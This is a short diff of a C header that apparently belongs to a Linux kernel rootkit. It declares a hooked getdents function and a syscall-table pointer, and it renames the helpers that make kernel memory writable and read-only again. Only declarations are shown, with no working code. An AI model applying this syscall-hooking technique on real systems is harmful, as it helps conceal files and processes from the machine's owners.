@@ -31,7 +31,7 @@ asmlinkage int new_getdents(const struct pt_regs *regs)
 unsigned long *syscall_table = NULL; //syscall_table address
 
 //remove and put back protected mode
-int set_addr_rw(unsigned long addr);
-int set_addr_ro(unsigned long addr);
+int unprotect_memory(unsigned long addr); //read and write
+int protect_memory(unsigned long addr); //read only
 
 #endif //FUNCTIONS_H
